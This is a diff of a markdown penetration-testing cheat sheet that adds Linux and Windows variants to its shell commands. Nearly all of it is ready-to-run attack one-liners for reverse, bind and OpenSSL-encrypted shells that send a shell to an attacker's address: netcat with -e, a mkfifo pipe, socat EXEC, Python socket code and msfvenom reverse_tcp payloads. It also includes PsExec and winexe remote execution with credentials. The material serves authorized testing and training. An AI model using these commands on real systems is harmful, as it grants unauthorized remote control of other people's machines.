@@ -30,20 +30,26 @@ Victim connnects and attacker listens. Used 95% of the time.
 - netcat
 	- attacker runs: `nc -nlvp 4444`
 	- victim runs: `nc -nv {ip-address} 4444 -e /bin/bash` 
+
 - socat
 	- attacker runs: `sudo socat -d -d  TCP4-LISTEN:4444 STDOUT`
-	- victim runs: `socat TCP4:{ip-address}:4444 EXEC:/bin/bash`
+	- victim runs (linux): `socat TCP4:{ip-address}:4444 EXEC:/bin/bash`
+	- victim runs (windows): `socat TCP4:{ip-address}:4444 EXEC:cmd.exe,pipes`
+
 - netcat without `-e` or `-c` on victim
 	- attacker runs: `nc -nlvp 4444`
 	- victim runs: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip-address} 1234 >/tmp/f`
+
 - msfvenom to create reverse shell binaries
 	- windows: `msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip-address} LPORT={port} -f exe -o reverse.exe`
 	- linux: 
 	- attacker can set up a listener with netcat of metasploit's multi/handler
+
 - python
 	- attacker runs: `nc -nlvp 4444`
 	- victim runs: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("PUT-IP-HERE",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
-	- upgrade a bad shell with pty: `python -c 'import pty; pty.spawn("/bin/bash")'` 
+
+- upgrade a bad shell with pty: `python -c 'import pty; pty.spawn("/bin/bash")'` 
 
 ## Bind Shells
 Victim listens and attacker connects. Useful when bypassing firewalls or when reverse shells "just don't work".
@@ -53,19 +59,30 @@ Victim listens and attacker connects. Useful when bypassing firewalls or when re
 	- attacker runs: `nc -nv 10.11.0.22 4444`
 
 - socat
-	- victim runs: `socat -d -d TCP4-LISTEN:4444 EXEC:/bin/bash`
+	- victim runs (linux): `socat -d -d TCP4-LISTEN:4444 EXEC:/bin/bash`
+	- victim runs (windows): `socat -d -d TCP4-LISTEN:443 EXEC:cmd.exe,pipes`
 	- attacker runs: `socat - TCP4:{ip-address}:4444`
 
 ## Encrypted shells with OpenSSL
 Utilize SSL certificates to encrypt data sent between hosts
 
+### Generate the cert
 - create an openssl certificate
 	- `openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 100 -out bind_shell.crt`
 - concatenate the certififcate and private key into a .pem file
 	- `cat bind_shell.key bind_shell.crt > bind_shell.pem`
-- socat listener utilizing the cert
-	- `sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash`
-- socat SSL connection to listener
+
+### Reverse shell
+- attacker socat listener utilizing the cert (linux)
+	- `sudo socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork`
+- victim socat SSL connection to listener (windows)
+	- `socat - OPENSSL:{ip-address}:443,verify=0 EXEC:cmd.exe,pipes`
+
+### Bind Shell
+- transfer cert to victim if openssl is not installed locally
+- victim socat listener utilizing the cert (windows)
+	- `socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork EXEC:cmd.exe,pipes`
+- attacker socat SSL connection to listener (linux)
 	- `socat - OPENSSL:{ip-address}:443,verify=0`
 
 ## Other Windows Shell-like options
@@ -78,6 +95,7 @@ Utilize SSL certificates to encrypt data sent between hosts
 	- `net start termservice`
 - [PSExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec): a light-weight telnet-replacement that lets you execute processes on other systems
 	- `.\PsExec64.exe -accepteula -i -s C:\path\to\reverse.exe` (see msfvenom to create reverse shell binaries)
+	- **don't** use this on real client systems! (it leaves artifacts)
 - [Winexe](https://tools.kali.org/maintaining-access/winexe): remotely execute commands on Windows from a Linux machine
 	- requires creds. If the creds you have are admin, you can use the --system option to spawn a system shell.
 	- `winexe -U '{user}%{password}' //{ip-address} cmd.exe`
